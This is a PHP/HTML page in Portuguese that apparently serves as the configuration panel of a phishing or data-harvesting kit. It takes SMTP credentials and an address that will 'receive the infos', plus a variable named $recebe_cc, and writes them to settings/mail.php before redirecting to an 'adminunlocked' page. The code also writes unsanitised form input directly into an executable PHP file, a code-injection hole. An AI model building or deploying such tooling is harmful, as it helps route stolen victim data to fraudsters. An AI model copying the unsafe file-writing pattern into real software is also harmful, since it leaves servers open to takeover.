<meta charset="utf-8">
<link rel="stylesheet" href="css/bootstrap.css">
<script src="js/jquery.js"></script>

<div style="position:absolute;background:rgba(0,0,0,0.4);width:100%;height:100%;"></div>
<div style="display: block;" class="modal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Configurações SMTP</h5>
        <small id="emailHelp" class="form-text text-muted">Erro com as configurações de e-mail. Configure novamente:</small>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form method="post">
		  <div class="form-group">
		    <label>Host</label>
		    <input type="text" class="form-control" name="host">
		  </div>
		  <div class="form-group">
		    <label>Porta</label>
		    <input type="text" class="form-control" name="port">
		  </div>
		  <div class="form-group">
		    <label>E-mail</label>
		    <input type="text" class="form-control" name="user">
		  </div>
		  <div class="form-group">
		    <label>Senha</label>
		    <input type="text" class="form-control" name="pass">
		  </div>
		  <div class="form-group">
		    <label>E-mail que vai receber as infos</label>
		    <input type="text" class="form-control" name="mail">
		  </div>
		<?php

			if ($_POST['submit']) 
			{
				if ($_POST['host']) 
				{
					if ($_POST['port']) 
					{
						if ($_POST['user']) 
						{
							if ($_POST['pass']) 
							{
								if ($_POST['mail']) 
								{
									$curl = '<?php'."\n\n\t".'$host_smtp = "'.$_POST['host'].'";'."\n\t".'$port_smtp = '.$_POST['port'].';'."\n\t".'$user_smtp = "'.$_POST['user'].'";'."\n\t".'$pass_smtp = "'.$_POST['pass'].'";'."\n\t".'$recebe_cc = "'.$_POST['mail'].'";'."\n\n\t".'if ($port_smtp == 465) {'."\n\t\t".'$security = "ssl";'."\n\t".'}elseif ($port_smtp == 587) {'."\n\t\t".'$security = "tls";'."\n\t".'}'."\n\n".'?>';
									$open = fopen("settings/mail.php", "w");
									fwrite($open,$curl);
									fclose($open);
									echo "<script>window.location='index.php?adminunlocked'</script>";
								}
								else echo '<div class="alert alert-danger">Coloque o e-mail que vai receber as infos</div>';
							}
							else echo '<div class="alert alert-danger">Coloque a senha</div>';
						}
						else echo '<div class="alert alert-danger">Coloque a usuário de e-mail</div>';
					}
					else echo '<div class="alert alert-danger">Coloque a porta</div>';
				}
				else echo '<div class="alert alert-danger">Coloque o host</div>';
			}

		?>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Fechar</button>
        <input type="submit" name="submit" class="btn btn-primary" value="Atualizar">
        </form>
      </div>
    </div>
  </div>
</div>